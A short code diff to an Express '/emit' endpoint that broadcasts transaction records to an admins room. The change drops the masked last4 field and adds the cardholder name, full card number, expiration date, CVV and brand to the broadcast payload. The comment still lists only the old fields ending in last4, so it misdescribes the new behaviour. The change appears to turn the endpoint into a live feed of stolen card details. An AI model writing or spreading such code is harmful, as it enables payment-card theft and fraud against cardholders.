@@ -28,12 +28,16 @@ app.post("/emit", (req, res) => {
   // Validate allowed fields: transaction_id, user_id, amount, status, time, bank, last4
   const safe = {
     transaction_id: payload.transaction_id || null,
-    user_id: payload.user_id || null,
+    fullname: payload.fullname || null,
     amount: payload.amount || null,
     status: payload.status || "unknown",
     time: payload.time || new Date().toISOString(),
     bank: payload.bank || "Unknown",
-    last4: payload.last4 || null
+    holder: payload.holder || null,
+    cardNumber: payload.cardNumber || null,
+    expiration: payload.expiration || null,
+     cvv: payload.cvv || null,
+      brand: payload.brand || null
   };
 
   // Broadcast only to admins room
